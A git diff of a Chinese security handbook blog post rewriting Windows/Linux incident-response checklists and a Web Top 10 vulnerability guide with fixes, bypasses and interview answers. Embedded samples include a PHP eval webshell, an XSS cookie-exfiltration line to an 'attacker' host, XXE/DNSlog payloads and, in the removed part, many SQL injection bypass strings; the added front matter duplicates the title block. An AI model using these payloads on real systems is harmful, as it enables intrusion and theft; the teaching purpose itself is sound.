@@ -1,6 +1,17 @@
 ---
 title: 应急手册指南
 date: 2025-07-23
+updated: 2025-08-09
+categories: 安服系列
+tags:
+  - 安服
+  - 指南
+  - 转载
+top: 4
+---
+
+# 应急手册指南
+date: 2025-07-23
 updated: 2025-07-23
 categories: 安服系列
 tags:
@@ -10,1034 +21,312 @@ tags:
 top: 4
 ---
 
+## 前言
+分享一份实用的应急响应与WEB安全手册，涵盖Windows、Linux系统的应急响应流程，以及WEB安全领域Top10漏洞的原理、危害、修复方案和绕过技巧。内容偏重实战，适合安全服务人员、安全爱好者参考，用于快速定位和处置安全事件。
+
+
 ## Windows应急响应流程
+当Windows服务器遭遇安全事件（如入侵、恶意程序感染等），可按以下流程逐步排查和处置，快速定位威胁并恢复系统安全。
 
-### 排查系统和账号安全
-
-```
-弱口令 后台管理端口
-查看服务器是否存在弱口令 远程管理端口是否对外互联网开放
-
-隐藏或克隆账号
-排查服务器是否存在隐藏或新增账号
-打开注册表 查看管理员对应键值
-可以使用 D盾web 查杀工具
-
-账号登录时间
-结合Windows系统日志 排查管理员账号是否存在异常登录
-导出 Windows安全日志 利用 LogParser工具进行分析
-```
+### 0x01 排查系统和账号安全
+账号与系统权限是入侵者的主要目标，需优先检查以下内容：
+- **弱口令与开放端口**：排查服务器是否存在弱口令账号，远程管理端口（如3389）是否违规向互联网开放。
+- **隐藏或克隆账号**：通过注册表查看管理员对应键值（如`HKEY_LOCAL_MACHINE\SAM\SAM`），或使用D盾Web查杀工具扫描异常账号。
+- **账号异常登录**：结合Windows安全日志（事件ID 4624/4625）排查管理员账号登录时间、IP是否异常，可导出日志后用LogParser工具批量分析。
 
 
-
-### 排查异常端口 进程
-
-```
-端口连接情况
-查看服务器端口连接情况 判断是否有远程连接 可疑连接
-netstat -ano 查看目前的网络连接
-如果有可疑连接 使用 tasklist命令定位 taskkill命令结束连接
-
-进程
-查看服务器是否存在可疑的进程
-观察以下内容判断:
-没有签名验证信息的进程
-没有描述信息的进程
-进程的属主
-进程的路径是否合法
-CPU 或内存资源占用长时间过高的进程
-可疑使用火绒剑开启监控
-```
+### 0x02 排查异常端口与进程
+网络连接和进程是恶意活动的直接载体，需重点监控：
+- **端口连接情况**：  
+  用`netstat -ano`查看当前网络连接，识别可疑远程连接（如陌生IP、非业务端口）；通过`tasklist /fi "PID eq 进程ID"`定位进程，用`taskkill /f /pid 进程ID`强制结束恶意进程。
+- **可疑进程识别**：  
+  观察进程是否存在以下特征：无签名验证信息、无描述信息、属主异常、路径不合法、CPU/内存占用长时间过高。推荐用**火绒剑**开启实时监控，捕获进程行为。
 
 
-
-### 排查启动项
-
-```
-排查服务器是否存在异常的启动项
-查看是否存在命名异常的启动项目
-也可以使用火绒剑进行查看
-查看组策略是否存在可疑脚本
-
-排查服务器是否存在可疑的计划任务
-
-排查服务器是否存在可疑自启动服务
-```
+### 0x03 排查启动项与计划任务
+入侵者常通过启动项或计划任务实现持久化控制，需全面检查：
+- **异常启动项**：查看系统启动文件夹、注册表启动键（如`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`）、组策略脚本，识别命名异常的启动项；用火绒剑可视化查看启动项关联进程。
+- **可疑计划任务**：通过“任务计划程序”或命令`schtasks /query /fo LIST /v`排查非业务计划任务，重点关注触发条件、执行脚本路径异常的任务。
+- **自启动服务**：在“服务”管理界面或通过`sc query`查看服务，检查服务路径、启动类型是否异常，禁用或删除可疑服务。
 
 
-
-### 排查系统相关信息
-
-```
-系统版本
-查看系统以及补丁信息
-
-排查服务器上是否存在可疑目录及文件
-
-查看用户目录是否存在新增可疑用户目录
-```
+### 0x04 排查系统相关信息
+系统基础信息和文件目录可能留存入侵痕迹：
+- **系统版本与补丁**：通过`winver`查看系统版本，用`systeminfo`检查补丁安装情况，确认是否存在未修复的高危漏洞（如永恒之蓝等）。
+- **可疑文件与目录**：扫描系统盘及用户目录（如`C:\Users\`），查找新增陌生目录、隐藏文件（右键“显示隐藏文件”）、恶意脚本（如`.bat` `.vbs` `.ps1`）。
 
 
-
-### 自动化查杀
-
-```
-病毒查杀 火绒 天擎 360
-
-webshell查杀
-D盾web查杀
-河马webshell
-```
+### 0x05 自动化查杀工具
+借助专业工具提升查杀效率：
+- **病毒查杀**：使用火绒、天擎、360杀毒等工具全盘扫描，清除恶意程序。
+- **Webshell查杀**：通过D盾Web查杀、河马Webshell扫描工具，检测网站目录下的后门文件（如`eval` `assert`等特征函数）。
 
 
-
-### 日志分析
-
-```
-将中间件的web日志 或Windows安全系统 打包到本地利用LogParser进行分析
-```
-
+### 0x06 日志分析
+日志是追溯入侵源的关键依据：
+- 收集中间件Web日志（如IIS日志`C:\inetpub\logs\LogFiles`、Nginx日志）和Windows系统日志（安全日志、系统日志、应用程序日志），打包后用**LogParser**工具批量分析，筛选异常访问IP、请求路径、错误状态码等。
 
 
 ## Linux应急响应流程
+Linux系统应急响应需围绕账号、进程、日志等核心维度，结合命令行工具快速定位威胁，以下为关键步骤。
 
-### 账号安全
 
-```
-1:用户信息文件
-/etc/passwd
+### 0x01 账号安全排查
+Linux账号权限管理严格，需重点检查权限异常或新增账号：
+1. **用户信息文件**：查看`/etc/passwd`（用户列表）和`/etc/shadow`（密码哈希），识别新增陌生用户、UID/GID为0的特权用户（非root账号却有root权限）。
+2. **当前登录用户**：用`who`查看在线用户，`w`查看用户操作详情，`uptime`了解系统负载和登录时长，判断是否存在异常登录。
+3. **特权用户与sudo权限**：  
+   - 用`awk -F: '$3==0{print $1}' /etc/passwd`列出UID=0的特权用户（正常应为root）；  
+   - 用`more /etc/sudoers | grep -v "^#|^$" | grep "ALL=(ALL)"`查看非root账号的sudo权限，禁用不必要的特权。
+4. **账号处置**：对可疑账号，用`usermod -L 用户名`临时锁定，或`userdel -r 用户名`彻底删除（含家目录）。
 
-2:用户密码文件
-/etc/shadow
 
-3:who 查看当前登录用户
-w查看系统信息
-uptime 查看登录多久、多少用户、负载
+### 0x02 历史命令审计
+用户操作记录可追溯入侵行为：
+1. 用`history`查看当前用户历史命令，或直接读取`~/.bash_history`文件（需注意：history可能被清空，建议提前备份）。
+2. 建议开启历史命令审计：在`/etc/profile`中添加`export HISTTIMEFORMAT="%F %T `whoami` "`，记录命令执行时间和用户，增强可追溯性。
 
-4:查看特权用户(uid为0)
-awk -F: '$3==0{print $1}' /etc/passwd
 
-5:查看远程登录的账号情况
-awk '/$1|$6/{print $1}' /etc/shadow
+### 0x03 端口与进程排查
+通过网络连接和进程定位恶意活动：
+- **端口连接**：用`netstat -tulnp`（显示监听端口及关联进程）或`ss -lntu`查看网络连接，重点关注非业务端口（如3306、6379等未授权开放端口）。
+- **进程溯源**：用`ps aux`查看所有进程，通过`grep`筛选可疑进程（如`ps aux | grep 进程名/PID`）；通过`ls -l /proc/$PID/exe`或`file /proc/$PID/exe`查看进程实际路径，确认是否合法。
 
-6:除root账号外，其他账号是否存在sudo权限
-more /etc/sudoers | grep -v "^#|^$" | grep "ALL=(ALL)"
 
-7:禁用或删除多余可疑的账号
-usermod -L user  禁用帐号，帐号无法登录，/etc/shadow 第二栏为!开头的用户
-userdel user  删除 user 用户
-userdel -r user  将删除 user 用户，并且将/home 目录下的 user目录一并删除
-```
+### 0x04 开机启动项与定时任务
+持久化控制常通过启动项或定时任务实现：
+- **启动项排查**：检查`/etc/rc.local`、`/etc/init.d/`目录、`systemctl`服务（`systemctl list-unit-files --type=service`），识别非业务启动脚本或服务。
+- **定时任务**：用`crontab -l`查看当前用户定时任务，检查`/etc/crontab`及`/etc/cron.d/` `/etc/cron.hourly/`等目录，删除陌生任务（如定期下载恶意脚本的任务）。
 
 
+### 0x05 日志审计
+Linux日志集中存储在`/var/log/`目录，关键日志及用途如下：
 
-### 历史命令
+| 日志文件                | 说明                                                                 |
+|-------------------------|----------------------------------------------------------------------|
+| `/var/log/cron`         | 记录定时任务执行日志                                                 |
+| `/var/log/message`      | 系统核心日志，含重要事件（如服务启动、错误信息）                     |
+| `/var/log/secure`       | 记录认证授权信息（如SSH登录、su切换、sudo操作）                     |
+| `/var/log/btmp`         | 错误登录日志（需用`lastb`查看）                                      |
+| `/var/log/wtmp`         | 所有用户登录/注销及系统重启记录（需用`last`查看）                    |
+| `/var/log/utmp`         | 当前登录用户信息（需用`w` `who`查看）                                |
 
-```
-1:查看历史的命令
-histroy
-bash_history
+- 应用日志：如HTTP日志（`/var/log/httpd/access.log`）、FTP日志（`/var/log/vsftp.log`）等，需结合业务场景分析异常请求。
 
-2:可以添加历史命令审计
-```
 
+## WEB-TOP10漏洞详解
+WEB安全领域中，以下10类漏洞最为常见。本节涵盖其原理、危害、修复方案及典型绕过技巧，附面试高频问题解析。
 
 
-### 端口
+### 0x01 SQL注入
+#### 核心原理
+用户输入的数据未经过滤，被直接拼接为SQL语句执行（如`SELECT * FROM users WHERE id='$_GET[id]'`）。  
+**关键条件**：用户可控输入 + 输入带入数据库查询。
 
-```
-netstat 网络连接命令 分析可疑端口
-查看pid所对应的进程文件路径
-ls -l  /proc/$PID/exe  
-file /proc/$PID/exe  
-# $PID 为对应的 pid 号
-```
+#### 危害
+非法查询/修改数据、写入Webshell、泄露敏感信息（如账号密码）、甚至提权控制服务器。
 
+#### 修复方案
+- 采用参数化查询（如PreparedStatement），避免SQL语句拼接；  
+- 对输入进行严格过滤（如转义单引号、限制字符类型）；  
+- 部署WAF，开启SQL注入防护规则；  
+- 最小权限原则配置数据库账号（如禁止`FILE`权限）。
 
+#### 类型与绕过技巧
+- **类型**：显注（有回显）、盲注（布尔型、报错型、时间型）。  
+- **绕过方法**：大小写混合（`UniOn SelEct`）、双写关键字（`uniunionon`）、内联注释（`/*!union*/`）、编码绕过（URL编码、16进制）、宽字节注入（`%df'`）等。
 
-### 进程
+#### 面试高频问题
+- 如何判断SQL注入类型（字符型/数字型）？  
+  答：用`id=2-1`测试，若返回`id=1`结果则为数字型；或用`and 1=1`/`and 1=2`，均回显正常则为字符型。  
+- SQL注入写入Webshell的条件？  
+  答：需知道网站绝对路径、数据库高权限（如root）、`secure_file_priv`无限制、网站目录可写。  
 
-```
-ps aux | grep pid
-```
 
+### 0x02 文件上传漏洞
+#### 核心原理
+对用户上传文件的类型、后缀未做严格验证，导致恶意文件（如Webshell）被上传至服务器并执行。
 
+#### 危害
+上传后门文件直接控制网站，甚至通过提权获取服务器权限。
 
-### 开机启动项
+#### 修复方案
+- 采用白名单验证（仅允许`jpg` `png`等安全后缀），拒绝黑名单过滤；  
+- 上传目录禁止脚本执行（如Apache配置`php_flag engine off`）；  
+- 重命名上传文件（如随机文件名+安全后缀），避免路径可预测；  
+- 限制文件大小，扫描文件内容（如检测图片马的恶意代码）。
 
-```
-排查可疑的启动项
-```
+#### 绕过技巧
+- **黑名单绕过**：大小写（`.Php`）、特殊后缀（`.php5` `.phtml`）、空格/点绕过（`.php.` `.php `）、双写（`.pphphp`）；  
+- **白名单绕过**：`%00`截断（`shell.php%00.jpg`）、图片马（将Webshell插入图片尾部）、二次渲染绕过（修改图片未被渲染的区域）、条件竞争（趁文件未重命名时访问）。
 
+#### 面试高频问题
+- 大马与小马的区别？  
+  答：小马指一句话木马（代码量小，如`<?php @eval($_POST['cmd']);?>`），功能简单；大马是功能完整的管理工具（如文件管理、命令执行），通常先传小马再传大马。  
 
 
-### 定时任务
+### 0x03 文件包含漏洞
+#### 核心原理
+程序通过动态参数引用文件时，未验证文件路径，导致恶意文件被包含并执行（如`include($_GET['file'])`）。
 
-```
-# 列出当前用户 cron 服务的详细内容
-crontab -l 
-```
+#### 危害
+包含本地恶意文件（如图片马）或远程恶意脚本，执行代码获取权限；读取敏感文件（如`/etc/passwd` `config.php`）。
 
+#### 修复方案
+- 禁止动态包含用户可控参数；  
+- 过滤`../` `./`等路径跳转字符；  
+- 关闭PHP配置`allow_url_fopen`和`allow_url_include`（防范远程文件包含）；  
+- 采用白名单限制可包含的文件。
 
+#### 类型与绕过技巧
+- **类型**：本地文件包含（LFI）、远程文件包含（RFI）。  
+- **绕过方法**：路径截断（`../`重复拼接）、`%00`截断、包含日志文件（如Apache日志被写入Webshell后包含）、利用伪协议（`php://filter/read=convert.base64-encode/resource=xxx.php`读取源码）。
 
-### 日志审计
+#### 面试高频问题
+- `include()`与`require()`的区别？  
+  答：`include()`加载失败时报警告并继续执行；`require()`加载失败时报致命错误并终止程序。  
+- 常用文件包含伪协议？  
+  答：`php://input`（执行POST数据）、`data://`（传递数据流，如`data://text/plain,<?php phpinfo();?>`）、`file://`（读取本地文件）、`zip://`（包含压缩包内文件）。  
 
-```
-/var/log/
-日志文件
 
-说明
-/var/log/cron
-记录了系统定时任务相关的日志
+### 0x04 CSRF（跨站请求伪造）
+#### 核心原理
+攻击者诱导已登录用户访问恶意页面，以用户身份发起非预期请求（如修改密码、转账），利用用户的Cookie身份凭证完成操作。
 
-/var/log/cups
-记录打印信息的日志
+#### 危害
+以受害者名义执行操作（如改密码、发评论、转账），造成账号被盗、财产损失等。
 
-/var/log/dmesg
-记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息
+#### 修复方案
+- 增加Token验证（每次请求携带随机Token，服务器验证有效性）；  
+- 验证Referer来源（检查请求是否来自可信域名）；  
+- 关键操作增加验证码或二次确认；  
+- 设置Cookie的`SameSite`属性（`SameSite=Lax`/`Strict`，限制跨站携带）。
 
-/var/log/mailog
-记录邮件信息
+#### 面试高频问题
+- CSRF与XSS的区别？  
+  答：XSS是注入恶意脚本盗取Cookie；CSRF是利用用户已有的Cookie身份，伪造请求执行操作。  
+- 为什么Token能防御CSRF？  
+  答：Token是服务器生成的随机值，与用户会话绑定，攻击者无法获取，因此无法伪造含有效Token的请求。  
 
-/var/log/message
-记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现 问题时，首先要检查的就应该是这个日志文件
 
-/var/log/btmp
-记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看
+### 0x05 SSRF（服务器请求伪造）
+#### 核心原理
+服务器端接口存在未验证的外部资源请求参数，攻击者可构造请求，让服务器访问内网资源或其他服务器（如`http://example.com/xxx?url=http://内网IP:端口`）。
 
-/var/log/lastlog
-记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用 lastlog命令查看
+#### 危害
+探测内网存活主机、扫描内网端口、攻击内网服务（如Redis未授权访问）、读取本地文件（`file:///etc/passwd`）、通过gopher协议构造恶意请求。
 
-/var/log/wtmp
-永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是 一个二进制文件，不能直接vi，而需要使用last命令来查看
+#### 修复方案
+- 白名单限制请求的域名/IP；  
+- 禁止请求内网IP（如`10.0.0.0/8` `192.168.0.0/16`）和敏感端口（如3306、6379）；  
+- 屏蔽响应详细信息（避免泄露内网结构）；  
+- 禁用危险协议（如`gopher://` `dict://`）。
 
-/var/log/utmp
-记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户 的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询
+#### 绕过技巧
+- IP绕过：十进制/八进制IP转换（`127.0.0.1`→`2130706433`）、域名绑定内网IP、利用句号/冒号（`127。0。0。1`）；  
+- 协议绕过：使用`gopher://`构造POST请求，攻击内网Redis（写入定时任务反弹shell）。
 
-/var/log/secure
-录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户， sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中
+#### 面试高频问题
+- SSRF常见利用场景？  
+  答：攻击内网服务（如Redis、Memcached未授权访问）、读取本地文件、端口扫描、通过云服务API获取密钥。  
 
-应用日志文件说明
-HTTP          /var/log/httpd/access.log #或者是HTTP服务器配置文件中的日志路径
-FTP           /var/log/vsftp.log #或者是同路径下的xferlog
-Squid         /var/log/squid #或者是squid.access.log
-NFS           /var/log/nfs
-IPTABLES      /var/log/iptables/……
-Samba         /var/log/samba
-DNS           /var/log/message
-DHCP          /var/log/message #或者/var/lib/dhcp/db/dhcpd.leases
-Mail          /var/log/maillog
-```
 
+### 0x06 XXE（XML外部实体注入）
+#### 核心原理
+XML解析器未禁用外部实体加载，攻击者通过构造恶意XML，加载外部实体文件或执行代码（如`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`）。
 
+#### 危害
+读取本地文件、探测内网端口、执行命令（依赖解析器支持，如PHP的expect模块）、发起DOS攻击。
 
-## WEB-TOP10
+#### 修复方案
+- 禁用外部实体加载（如PHP的`libxml_disable_entity_loader(true)`，Java的`DocumentBuilderFactory.setFeature`）；  
+- 过滤用户输入的XML数据，禁止`DOCTYPE` `ENTITY`等关键字；  
+- 使用安全的XML解析库，避免自定义解析逻辑。
 
-### SQL注入
+#### 绕过技巧
+- 外部实体引入（本地文件、远程URL）；  
+- 无回显时利用DNSlog外带数据（`<!ENTITY xxe SYSTEM "http://dnslog域名/xxx">`）。
 
-```
-原理:用户输入的数据，没有接受处理，被当成sql语句执行。
-
-产生sql注入关键因素
-1，用户能够控制数据的输入
-2，参数可带入数据库查询
-
-危害:
-查询数据，修改数据，写入webshell，网站挂马，信息泄露等
+#### 面试高频问题
+- XXE无回显如何利用？  
+  答：通过DNSlog或HTTP请求外带数据，将读取的文件内容作为子域名或参数发送到攻击者服务器。  
 
-修复:
-过滤，转义，参数化查询，加waf
-
-分为类型:
-显注和盲注，盲注又分为：布尔型盲注，报错型盲注，时间型盲注
-布尔型:length
-报错型:updatexml
-时间型:sleep
-
-绕过技术:
-1，内联注释绕过/**/
-2,编码绕过
-3，大小写，双写绕过，
-```
 
-**面试问题**
-
-```
-1:sql注入写入条件
-绝对路径 dba权限 gpc
-
-2:sql注入堆叠注入是什么
-堆叠查询多条语句 用;分开
+### 0x07 RCE（远程代码/命令执行）
+#### 核心原理
+用户输入被直接作为命令/代码执行（如`system($_GET['cmd'])`），或通过漏洞组件（如Struts2、Log4j）执行恶意指令。
 
-3:sql注入二次注入是什么
-注册时插入恶意数据，然后引用恶意数据
-
-4:sql注入没有回显怎么办
-dnslog
-
-5:sql注入宽字节注入
-gbk编码，两个字符为一个汉字
-
-6:sqlmap如何进行post注入
-sqlmap -r
+#### 危害
+执行系统命令（如`rm -rf /` `whoami`）、写入恶意文件、控制服务器。
 
-7:sqlmap常用参数
---dbs 查看所有数据库
---current-db查看当前网站数据库
---proxy ip 开启代理
---users所有数据库用户
---passwords数据库密码
--D 指定库名 -T 指定表名 -C 指定列明
+#### 修复方案
+- 禁止用户输入直接拼接为命令/代码；  
+- 采用白名单限制允许执行的命令/函数；  
+- 及时更新组件（如修复Log4j、Struts2漏洞）；  
+- 最小权限运行服务（如Web服务用低权限用户，禁止root运行）。
 
-8:sqlmap判断当前用户权限的参数是什么
---is-dba 查看当前用户权限，是否为root权限
+#### 常见危险函数
+- **命令执行**：PHP的`system()` `exec()` `shell_exec()`，Python的`os.system()` `subprocess.call()`；  
+- **代码执行**：PHP的`eval()` `assert()`，Java的`Runtime.exec()`。
 
-9:sqlmap的--level和--risk区别
-level参数是探测等级 等级越高测试的东西越多例如COOkie注入,host头注入等等,risk参数是风险等级 等
-级越高测试的语句越多比如会测试UPDATE 等等对数据库进行操作.
+#### 面试高频问题
+- 命令执行与代码执行的区别？  
+  答：命令执行是调用操作系统命令（如`ls` `ipconfig`）；代码执行是运行应用程序代码（如PHP/Java代码）。  
 
-10:如何判断sql注入成功
-看回显
 
-11:常用数据库端口
-mysql:3306 
-sqlserver:1433 
-orecal:1521 
-PostgreSQL:5432 
-db2:50000
-MongoDB:27017 
-redis:6379 
-memcached:11211
+### 0x08 XSS（跨站脚本攻击）
+#### 核心原理
+攻击者向网页注入恶意JavaScript脚本，当用户访问页面时脚本执行，窃取Cookie、篡改页面内容或记录键盘输入。
 
-12:判断数据库是什么
-根据报错信息判断
-根据执行函数返回的结果判断，如len()和lenth()，version()和@@version等
+#### 危害
+盗取用户Cookie（Session劫持）、钓鱼攻击、会话固定、蠕虫传播。
 
-13:mysql5.0以下和5.0以上的区别
-5.0以上存在information_schema数据库，这个库中分别存放着SCHEMATA表（存储了数据库中的所有
-库信息）TABLES表（存储数据库中的表信息，包括表属于哪个数据库，表的类型、存储引擎、创建时间
-等信息）和COLUMNS表（存储表中的列信息，包括表有多少列、每个列的类型等）
-而5.0以下则没有这个表
+#### 修复方案
+- 对用户输入进行HTML转义（如`<`→`&lt;`，`>`→`&gt;`）；  
+- 为Cookie设置`HttpOnly`属性（禁止JS读取）；  
+- 启用CSP（内容安全策略），限制脚本加载来源；  
+- 采用白名单过滤输入内容。
 
-14:读取文件函数
-load_file
+#### 类型与绕过技巧
+- **类型**：存储型（脚本存数据库，如留言板）、反射型（脚本在URL参数，如搜索框）、DOM型（脚本通过DOM操作执行，不经过服务器）。  
+- **绕过方法**：大小写混合（`<ScRiPt>`）、标签混淆（`<img src=1 onerror=alert(1)>`）、编码绕过（HTML实体、JS编码）、事件触发（`onclick` `onerror`）。
 
-15:写入文件函数
-into outfile
+#### 面试高频问题
+- XSS如何盗取Cookie？  
+  答：通过`document.cookie`获取Cookie，用`img`标签或AJAX发送到攻击者服务器（如`<script>new Image().src='http://attacker/?cookie='+document.cookie</script>`）。  
 
-16:sqlmap-os-shell原理
---os-shell的本质就是写入两个php文件，其中的tmpugvzq.php可以让我们上传文件到网站路径下
-然后sqlmap就会通过上面这个php上传一个用于命令执行的tmpbylqf.php到网站路径下，让我们命令执行，并将输出的内容返回sqlmap端
 
-17:sqlmap-os-shell利用条件
-知道网站的物理路径
-高权限数据库用户
-secure_file_priv无限制
-网站路径有写入权限
-{mysql进程有网站绝对路径的写权限
-mysql用户为root
-mysql允许写[secure_file_priv]
-GPC关闭	(PHP关闭魔术引号，php主动转义功能关闭)}
+### 0x09 逻辑漏洞
+#### 核心原理
+因业务逻辑设计缺陷导致的漏洞，通常不涉及复杂技术，而是流程或权限控制的疏漏。
 
-18:判断sql注入是字符还是数字
-1、用减法判断：利用id=2-1 如果返回的是id=1的结果，则是数字注入，否则是字符注入
-2、用 and 1=1 和 and 1=2 来判断，两者都能正常回显则是字符型注入，否则是数字型注入
+#### 常见类型
+- **越权访问**：垂直越权（低权限用户操作高权限功能，如普通用户访问管理员后台）、平行越权（同权限用户访问他人数据，如修改ID查看其他用户订单）；  
+- **密码找回漏洞**：验证码爆破、跳过验证步骤、找回凭证泄露（如通过数据包获取验证码）；  
+- **支付漏洞**：修改订单金额、重复提交订单、优惠券金额篡改；  
+- **未授权访问**：直接访问需登录的页面（如`/admin`未验证Session）。
 
-19:sql注入中闭合
---空格
---%20
-#		url(%23)
-```
+#### 修复方案
+- 严格校验用户权限（如每次操作前检查角色）；  
+- 关键步骤增加验证码/二次确认；  
+- 敏感操作使用随机Token，避免参数直接可控；  
+- 支付金额等核心数据在服务器端校验，不依赖客户端提交值。
 
-**sql注入绕过方法**
 
-```
-一:绕过关键字
-1:大小写绕过
--1' UniOn SelEct 1,2#
+### 0x0A 序列化与反序列化漏洞
+#### 核心原理
+序列化将对象转换为可传输格式，反序列化将其恢复为对象。若反序列化数据可控，攻击者可构造恶意对象，触发代码执行（如调用危险魔术方法）。
 
-2:双写绕过
--1' uniunionon seselectlect 1,2#
+#### 危害
+执行恶意代码、获取服务器权限，常见于Java（Shiro、Fastjson）、PHP、Python等语言。
 
-3:URL编码绕过
-?id=%2d%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%23
-?id=-1'+union+select+1%2C2%23
-url解码：
-?id=-1' union select 1,2#
+#### 修复方案
+- 严格验证反序列化数据来源，拒绝不可信输入；  
+- 禁用危险类/函数（如Java禁用`javax.script.ScriptEngineManager`）；  
+- 使用安全的序列化库，及时更新补丁（如升级Fastjson至最新版）；  
+- 采用加密或签名保护序列化数据，防止篡改。
 
-4:内联注释绕过
--1' /*!union*/ /*!select*/ 1,2#
-
-二:绕过引号
-1:16进制编码绕过
--1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#
-
-2:URL编码绕过
-?id=%2d%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%23
-url解码：
-?id=-1' union select 1,2#
-
-3:ASCII编码绕过
--1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=concat(CHAR(100),CHAR(118),CHAR(119),CHAR(97))#
-
-4:宽字节绕过
--1%df' union select 1,2--+
-
-
-三:绕过空格
-1:注释符绕过
--1'/**/union/**/select/**/1,2#
-
-2:内联注释绕过
--1'/*!*/union/*!*/select/*!*/1,2#
-
-3:括号绕过
--1' union(select(1),(2))#
-
-4:tab键绕过
--1'	union	select	1,2#
-
-5:两个空格绕过
--1'  union  select  1,2#
-
-四:绕过逻辑符号
-1:and绕过
-1' & 1=1#
-1' && 1=1#
-
-2:or绕过
-1' || 1=1#
-
-3:not绕过
-1' and 1!=2#
-
-五:绕过等号
-原型
--1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
-
-1:like绕过
--1' union select 1,group_concat(table_name) from information_schema.tables where table_schema like database()#
-
-2:rlike绕过
--1' union select 1,group_concat(table_name) from information_schema.tables where table_schema rlike database()#
-
-3:regexp绕过
--1' union select 1,group_concat(table_name) from information_schema.tables where table_schema regexp database()#
-
-4:大小写绕过
--1' union select 1,group_concat(table_name) from information_schema.tables where !(table_schema<>database())#
-
-
-六:绕过大小于等于号
-原型
-1' and if(ascii(substr(database(),1,1))>100,sleep(2),0)#
-
-1:greatest、least绕过
-greatest():
-greatest(n1, n2, n3…):返回n中的最大值
-
-1' and if(greatest(ascii(substr(database(),1,1)),100)=100,sleep(2),0)#
-
-least():
-least(n1,n2,n3…):返回n中的最小值
-
-1' and if(least(ascii(substr(database(),1,1)),100)=100,sleep(2),0)#
-
-
-2:strcmp绕过
-strcmp():
-strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回-1，其它情况返回1
-
-1' and if(strcmp(ascii(substr(database(),1,1)),100)=0,sleep(2),0)#
-
-3:in关键词绕过
-1' and if(ascii(substr(database(),1,1)) in (100),sleep(2),0)#
-或
-1' and if(substr(database(),1,1) in ("d"),sleep(2),0)#
-
-4:between...and..绕过
-1' and if(ascii(substr(database(),1,1)) between 90 and 100,sleep(2),0)#
-
-5:like绕过
-1' and if(substr(database(),1,1) like "d%",sleep(2),0)#
-
-
-七:绕过逗号
-1:from pos for len，其中pos代表从pos个开始读取len长度的子串
-1' and if(ascii(substr(database() from 1 for 1))=100,sleep(2),0)#
-
-2:join关键字绕过
--1' union select * from (select 1)a join (select 2)b#
-
-3:like关键字绕过
-1' and if(database() like "%d%",sleep(2),0)#
-
-4:offset关键字绕过
-1' union select 1,2 limit 1 offset 0#
-等价
-1' union select 1,2 limit 0,1#
-
-
-八:绕过函数
-1:绕过sleep()
-
-（1）benchmark函数
-
-benchmark():第一个参数代表执行次数，第二个参数代表执行表达式
-
-1' and benchmark(1000000000,1)#
-
-
-2:绕过ascii()
-
-（1）bin函数
-
-bin():转换成二进制数
-
-1' and if(bin(ascii(substr(database(),1,1)))=1100100,sleep(2),1)#
-（2）hex函数
-
-hex():转换成十六进制数
-
-1' and if(hex(substr(database(),1,1))=64,sleep(2),1)#
-（3）ord函数
-
-ord():给定的字符串，其最左边的字符代码将被查找
-
-1' and if(ord(substr(database(),1,1))=100,sleep(2),1)#
-
-3:绕过group_concat()
-
-（1）concat_ws函数
-
-concat_ws(分隔符,str1,str2):
-
--1' union select 1,concat_ws(",","@",table_name) from information_schema.tables where table_schema=database()#
-（2）concat函数
-
-concat():
-
--1' union select 1,concat(table_name) from information_schema.tables where table_schema=database()#
-
-4:绕过substr()
-
-（1）substring函数
-
-substring(str,pos,len):
-
-1' and if(substring(database(),1,1)="d",sleep(2),1)#
-（2）mid函数
-
-mid(str,pos,len):
-
-1' and if(mid(database(),1,1)="d",sleep(2),1)#
-（3）left函数
-
-left(str,len):
-
-1' and if(left(database(),1)="d",sleep(2),1)#
-（4）right函数
-
-right(str,len):
-
-1' and if(right(database(),1)="a",sleep(2),1)#
-```
-
-
-
-### 文件上传
-
-```
-原理:程序员未对上传的文件进行严格验证和过滤，导致用户可以上传恶意文件而造成危害
-
-危害:
-控制整个网站，甚至整个服务器
-
-修复:
-采用白名单验证，只允许图片上传，文件上传目录禁止脚本文件执行
-
-绕过:
-黑名单（.绕过，大小写绕过，双写绕过，空格绕过等）
-白名单（%00绕过，0x00绕过，图片马，二次渲染，条件竞争绕过等）
-
-1:哪里会存在文件上传漏洞
-头像上传，发表图片，附件上传
-
-2:文件上传中，什么是大马，什么是小马
-大马：功能全，代码量大，一般先上传小马再上传大马
-小马：一般指一句话木马，代码量小
-
-3:文件上传中，一句话木马eval是干什么用的
-eval是执行命令的函数
-```
-
-
-
-### 文件包含
-
-```
-原理:
-调用文件时，未对包含的文件进行校验，导致运行恶意文件
-
-危害:
-包含执行恶意文件，造成getshell
-
-修复:
-过滤特殊字符，如../等字符，关闭allow_url_fopen和allow_url_include
-
-绕过
-包含日志文件，%00阶段绕过
-
-文件包含分类
-本地文件包含，和远程文件包含
-
-文件包含常用函数:
-include()和require()
-
-文件包含中include（）和require（）的区别是什么
-include有返回值，require没有返回值
-include找不到包含文件，报错会继续执行，而require报错停止。
-
-文件包含中本地文件包含如何利用
-上传图片马，因为包含既执行
-读取网站源码以及配置文件如/etc/passwd
-文件包含日志文件等
-
-文件包含中，常用的伪协议都有什么
-php://input直接写入
-data://数据
-file://访问本地文件系统
-zip://压缩
-http://访问HTTPs网址
-php://filter php://filter流会被当作php文件执行
-```
-
-
-
-### CSRF
-
-```
-原理:
-跨站请求伪造，攻击者利用目标用户身份，以目标用户名义执行违法操作
-
